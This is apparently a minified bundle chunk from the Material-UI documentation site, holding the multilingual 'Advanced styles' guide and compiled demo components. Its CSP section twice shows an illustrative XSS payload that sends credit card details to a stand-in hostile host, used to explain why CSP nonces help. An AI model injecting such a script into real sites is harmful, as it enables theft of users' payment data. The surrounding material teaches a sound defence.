sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nThis vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### How does one implement CSP?\n\nIn order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.\n\nA CSP nonce is a Base 64 encoded string. You can generate one like this:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nThen, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags.\n\nThe way that you do this is by passing a `<meta property=\"csp-nonce\" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property=\"csp-nonce\"` tag and use the `content` value as the nonce.\n\nYou must include this header regardless of whether or not SSR is used. Here is an example of what a fictional header could look like:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```"},Rsxw:function(e,n){e.exports="import * as React from 'react';\nimport PropTypes from 'prop-types';\nimport { ThemeProvider, withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nDeepChildRaw.propTypes = {\n  theme: PropTypes.shape({\n    spacing: PropTypes.string.isRequired,\n  }).isRequired,\n};\n\nconst DeepChild = withTheme(DeepChildRaw);\n\nfunction WithTheme() {\n  return (\n    <ThemeProvider\n      theme={{\n        spacing: '8px',\n      }}\n    >\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n\nexport default WithTheme;\n"},RuvM:function(e,n){e.exports="import * as React from 'react';\nimport { ThemeProvider, useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n\nexport default function UseTheme() {\n  return (\n    <ThemeProvider\n      theme={{\n        spacing: '8px',\n      }}\n    >\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n"},Scow:function(e,n){e.exports="# Erweitert\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/core/styles.</p>\n\n## Theming\n\nAdd a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Anschlie\xdfend k\xf6nnen Sie in den Stilfunktionen auf das Designobjekt zugreifen.\n\n> This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createMuiTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Zugriff auf das Theme in einer Komponente\n\nM\xf6glicherweise m\xfcssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.\n\n#### `useTheme` hook\n\nFor use in function components:\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\nFor use in class or function components:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Verschachtelung des Themes\n\nSie k\xf6nnen mehrere Theme Provider verschachteln. Dies kann sehr n\xfctzlich sein, wenn Sie sich mit unterschiedlichen Bereichen Ihrer Anwendung befassen, die sich voneinander unterscheiden.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nDas innere Theme ** \xfcberschreibt** das \xe4u\xdfere Theme. Sie k\xf6nnen das \xe4u\xdfere Theme erweitern, indem Sie eine Funktion bereitstellen:\n\n```jsx\n<ThemeProvider theme={\u2026} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## \xdcberschreiben der Styles `classes` Eigenschaft\n\nDie `makeStyle` (Hook-Generator) und `withStyles` (HOC) APIs erm\xf6glichen die Erstellung mehrerer Stilregeln pro Stylesheet. Jede Stilregel hat einen eigenen Klassennamen. Die Klassennamen werden der Komponente mit der `classes` Variable zur Verf\xfcgung gestellt. Dies ist besonders n\xfctzlich, wenn Sie verschachtelte Elemente in einer Komponente formatieren.\n\n```jsx\n// Ein Stylesheet\nconst useStyles = makeStyles({\n  root: {}, // eine Stil Regel\n  label: {}, // eine verschachtelte Regel\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        verschachtelt\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nDie Klassennamen sind jedoch h\xe4ufig nicht deterministisch. Wie kann eine \xfcbergeordnete Komponente den Stil eines verschachtelten Elements \xfcberschreiben?\n\n### `withStyles`\n\nDies ist der einfachste Fall. Die umschlossene Komponente akzeptiert die `classes` Eigenschaft, welches einfach die mit dem Stylesheet gelieferten Klassennamen zusammengef\xfchrt wird.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### `makeStyles`\n\nDie Hook-API erfordert etwas mehr Arbeit. Sie m\xfcssen die \xfcbergeordneten Eigenschaften als erstes Argument an den Hook \xfcbergeben.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS-Plugins\n\nJSS nutzt Plugins um seinen Kern zu erweitern, sodass Sie die Funktionen, die Sie ben\xf6tigen ausw\xe4hlen k\xf6nnen. Sie bezahlen nur f\xfcr den Leistungsaufwand, den Sie verwenden.\n\nNicht alle Plugins sind standardm\xe4\xdfig in der Material-UI verf\xfcgbar. Folgende (die eine Teilmenge von [jss-preset-default](https://cssinjs.org/jss-preset-default/) sind) sind inklusive:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nSelbstverst\xe4ndlich k\xf6nnen Sie weitere Plugins benutzen. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n```\n\n## String-Vorlagen\n\nWenn Sie die CSS-Syntax gegen\xfcber JSS bevorzugen, k\xf6nnen Sie das [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) Plugin verwenden.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nBeachten Sie, dass dies keine Selektoren oder verschachtelten Regeln unterst\xfctzt.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS-Injektionsreihenfolge\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nStandardm\xe4\xdfig werden die Style-Tags **zuletzt** im `<head>` -Element der Seite eingef\xfcgt. Sie erhalten mehr Details als jedes andere Styletag auf Ihrer Seite, z.B. CSS-Module oder StilKomponenten.\n\n### injectFirst\n\nDer `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um **zuerst** die Style-Tags im Kopf einzuf\xfcgen (weniger Priorit\xe4t):\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Mit Stil versehene Komponenten k\xf6nnen die Stile von Material-UI \xfcberschreiben. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nDas Einf\xfcgen von Style-Tags erfolgt in der **gleichen Reihenfolge** wie die `makeStyles`/`withStyles`/`styled` Aufrufe. Zum Beispiel gewinnt die Farbe Rot in diesem Fall:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // \ud83d\udd35\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // \ud83d\udd34\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red \ud83d\udd34 wins.\n  return <div className={className} />;\n}\n```\n\nDie Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen keine Rolle**.\n\n### insertionPoint\n\nJSS [bietet einen Mechanismus](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) um diese Situation zu kontrollieren. Durch Hinzuf\xfcgen der Platzierung des `Einf\xfcgepunkts` innerhalb Ihres HTML-Heads k\xf6nnen Sie die [Reihenfolge steuern](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order), sodass die CSS-Regeln auf Ihre Komponenten angewendet werden.\n\n#### HTML-Kommentar\n\nAm einfachsten ist es, einen HTML-Kommentar zum `<head>` hinzuzuf\xfcgen, der bestimmt, wo JSS die Stile einf\xfcgt:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Other HTML elements\n\n[Create React App](https://github.com/facebook/create-react-app) entfernt HTML-Kommentare beim Erstellen des Produktions-Builds. Um dieses Problem zu umgehen, k\xf6nnen Sie ein DOM-Element (nicht einen Kommentar) als JSS-Einf\xfcgepunkt angeben, z. B. `<noscript>`:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io verhindert Zugriff auf das `<head>` Element. Um dieses Problem zu umgehen, k\xf6nnen Sie die JavaScript `document.createComment()` API verwenden:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## Server-Rendering\n\nIn diesem Beispiel wird ein Html-String zur\xfcckgegeben und die erforderliche kritische Css direkt vor ihrer Verwendung eingebettet:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nThere is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Anleitungen zur Einrichtung und Verwendung finden Sie auf der Seite des Plugins.\n\nRefer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nSie m\xfcssen \xfcber eine benutzerdefiniertes `pages/_document.js` haben und [diese Logik](https://github.com/mui-org/material-ui/blob/next/examples/nextjs/pages/_document.js) kopieren, um die serverseitig gerenderten Stile in das `<head>` Element hinzuzuf\xfcgen.\n\nSiehe [dieses Beispielprojekt](https://github.com/mui-org/material-ui/blob/next/examples/nextjs) f\xfcr ein aktuelles Verwendungsbeispiel.\n\n## Klassennamen\n\nDie Klassennamen werden von dem [Klassennamengenerator](/styles/api/#creategenerateclassname-options-class-name-generator) generiert. Nehmen wir den folgenden Stil als Beispiel.\n\n### Standard\n\nBy default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Nehmen wir den folgenden Stil als Beispiel:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nDadurch wird ein Klassenname wie `makeStyles-root-123` generiert.\n\nSie m\xfcssen die `Klassen` Eigenschaft einer Komponente verwenden, um die Styles zu \xfcberschreiben. Die nicht deterministische Natur der Klassennamen erm\xf6glicht die Stilisolation.\n\n- In der **Entwicklung** lauten der Klassenname: `.makeStyles-root-123` nach dieser Logik:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In der **Produktion** lauten der Klassenname: `.jss123` nach dieser Logik:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### Mit `@material-ui/core`\n\nDie generierten Klassennamen der `@material-ui/core` Komponenten verhalten sich anders. Wenn die folgenden Bedingungen erf\xfcllt sind, sind die Klassennamen **deterministisch**:\n\n- Es wird nur ein Themeanbieter verwendet (**Keine Verschachtelung von Themes**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nDiese Bedingungen werden bei den h\xe4ufigsten Anwendungsf\xe4llen von `@material-ui/core` erf\xfcllt. Zum Beispiel dieses Stylesheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* \u2026 */ },\n  label: { /* \u2026 */ },\n  outlined: {\n    /* \u2026 */\n    '&$disabled': { /* \u2026 */ },\n  },\n  outlinedPrimary: {\n    /* \u2026 */\n    '&:hover': { /* \u2026 */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngeneriert die folgenden Klassennamen, die Sie \xfcberschreiben k\xf6nnen:\n\n```css\n.MuiButton-root { /* \u2026 */ }\n.MuiButton-label { /* \u2026 */ }\n.MuiButton-outlined { /* \u2026 */ }\n.MuiButton-outlined.Mui-disabled { /* \u2026 */ }\n.MuiButton-outlinedPrimary: { /* \u2026 */ }\n.MuiButton-outlinedPrimary:hover { /* \u2026 */ }\n```\n\n*Dies ist eine Vereinfachung des `@material-ui/core/Button` Stylesheet der Komponente.*\n\nDie Anpassung des TextFields kann mit der [ `classes-`API ](#overriding-styles-classes-prop) m\xfchsam sein, wo Sie die classes Eingenschaft definieren m\xfcssen. Die Standardwerte sind, wie oben beschrieben, einfacher zu verwenden. Zum Beispiel:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; \ud83d\udc9a\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; \ud83d\udc94\n    }\n    &:hover fieldset {\n      border-color: yellow; \ud83d\udc9b\n    }\n    &.Mui-focused fieldset {\n      border-color: green; \ud83d\udc9a\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Globales CSS\n\n### `jss-plugin-global`\n\nDas [`jss-plugin-global`](#jss-plugins) Plugin ist in der Standardvoreinstellung installiert. Sie k\xf6nnen es verwenden, um globale Klassennamen zu definieren.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nSie k\xf6nnen auch JSS-generierte Klassennamen mit globalen Namen kombinieren.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS-Pr\xe4fix\n\nJSS verwendet Featureerkennung, um die korrekten Pr\xe4fixe anzuwenden. [Seien Sie nicht \xfcberrascht](https://github.com/mui-org/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Pr\xe4fix sehen k\xf6nnen. Ihr Browser ben\xf6tigt es wahrscheinlich nicht.\n\n## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)\n\n### Was ist CSP und warum ist es n\xfctzlich?\n\nGrunds\xe4tzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zur\xfcckgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen f\xfcr XSS anf\xe4lligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, k\xf6nnte ein Angreifer Folgendes eingeben:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nDiese Sicherheitsanf\xe4lligkeit erm\xf6glicht es dem Angreifer, irgendetwas auszuf\xfchren. Mit einem sicheren CSP-Header l\xe4dt der Browser dieses Skript jedoch nicht.\n\nWeitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### Wie kann man CSP implementieren?\n\nUm CSP mit Material-UI (und JSS) verwenden zu k\xf6nnen, m\xfcssen Sie eine Nonce verwenden. Eine Nonce ist eine zuf\xe4llig generierte Zeichenfolge, die nur einmal verwendet wird. Daher m\xfcssen Sie eine Server-Middleware hinzuf\xfcgen, um f\xfcr jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie f\xfcr einen grundlegenden \xdcberblick weiter.\n\nEine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie k\xf6nnen so erstellen:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nEs ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header k\xf6nnte mit der angewendeten Nonce so aussehen:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nWenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers \xfcbergeben.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nDann m\xfcssen Sie dieses Nonce an JSS \xfcbergeben, damit es den nachfolgenden `<style>`-Tags hinzugef\xfcgt werden kann.\n\nThe way that you do this is by passing a `<meta property=\"csp-nonce\" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property=\"csp-nonce\"` tag and use the `content` value as the nonce.\n\nSie m\xfcssen diesen Header unabh\xe4ngig davon angeben, ob SSR verwendet wird oder nicht. Here is an example of what a fictional header could look like:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```\n"},TunK:function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return c}));var s=t("mXGw"),o=t("PDtE"),r=t("yZEQ"),i=s.createElement,a=Object(r.a)({root:{"&.root":{height:100,width:100,backgroundColor:"blue"},"& .child":{height:8,backgroundColor:"red"}}}),l=i("div",{className:"child"});function c(){var e=a();return i("div",{className:Object(o.a)(e.root,"root")},l)}},W1Q1:function(e,n){e.exports="import * as React from 'react';\nimport styled from 'styled-components';\nimport { TextField, NoSsr } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.Mui-focused {\n    color: green;\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red;\n    }\n    &:hover fieldset {\n      border-color: yellow;\n    }\n    &.Mui-focused fieldset {\n      border-color: green;\n    }\n  }\n`;\n\nexport default function GlobalClassName() {\n  return (\n    <NoSsr>\n      <StyledTextField\n        label=\"Deterministic\"\n        variant=\"outlined\"\n        id=\"deterministic-outlined-input\"\n      />\n    </NoSsr>\n  );\n}\n"},WLtd:function(e,n,t){"use strict";function s(e){return e}t.d(n,"a",(function(){return s}))},aUig:function(e,n){e.exports="import * as React from 'react';\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStyles = makeStyles({\n  root: {\n    '&.root': {\n      height: 100,\n      width: 100,\n      backgroundColor: 'blue',\n    },\n    '& .child': {\n      height: 8,\n      backgroundColor: 'red',\n    },\n  },\n});\n\nexport default function HybridCss() {\n  const classes = useStyles();\n\n  return (\n    <div className={clsx(classes.root, 'root')}>\n      <div className=\"child\" />\n    </div>\n  );\n}\n"},am8y:function(e,n,t){"use strict";t.r(n);var s=t("0tNF"),o=t("mXGw"),r=t("+e5d"),i=t("yZEQ"),a=t("IOrS"),l=t("iBBK"),c=/;\n/,d=function(e){"string"===typeof e.style&&(e.style=function(e){for(var n={},t=e.split(c),s=0;s<t.length;s++){var o=(t[s]||"").trim();if(o){var r=o.indexOf(":");if(-1!==r){var i=o.substr(0,r).trim(),a=o.substr(r+1).trim();n[i]=a}}}return n}(e.style))};var u=function(){return{onProcessRule:d}},m=o.createElement,h=Object(l.b)({plugins:[u()].concat(Object(s.a)(Object(r.a)().plugins))}),p=Object(i.a)({root:"\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  "});var g=m(a.b,{jss:h},m((function(){var e=p();return m("button",{type:"button",className:e.root},"String templates")}),null));n.default=function(){return g}},big6:function(e,n,t){"use strict";t.r(n);var s=t("mXGw"),o=t("005G"),r=t("h7Hf"),i=s.createElement;var a=Object(o.a)((function(e){return i("span",null,"spacing ".concat(e.theme.spacing))})),l=i(a,null);n.default=function(){return i(r.a,{theme:{spacing:"8px"}},l)}},dg2h:function(e,n){e.exports="# Avanzado\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/core/styles.</p>\n\n## Tem\xe1tica\n\nAdd a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Then, you can access the theme object in style functions.\n\n> Este ejemplo crea un objeto de tema para componentes construidos a medida. Si pretende utilizar algunos de los componentes de Material-UI, necesita proporcionar una estructura de tema m\xe1s rica utilizando el m\xe9todo `createMuiTheme()`. Dir\xedgete a la secci\xf3n [tem\xe1tica](/customization/theming/) para aprender c\xf3mo construir tu tema personalizado de Material-UI.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Accediendo al tema en un componente\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\nFor use in function components:\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\nFor use in class or function components:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Theme nesting\n\nUsted puedes anidar multiples proveedores de tema. This can be really useful when dealing with different areas of your application that have distinct appearance from each other.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nEl tema interno **sobrescribir\xe1** el tema exterior. Puede ampliar el tema externo proporcionando una funci\xf3n:\n\n```jsx\n<ThemeProvider theme={\u2026} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. This is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### `withStyles`\n\nThis is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### `makeStyles`\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of 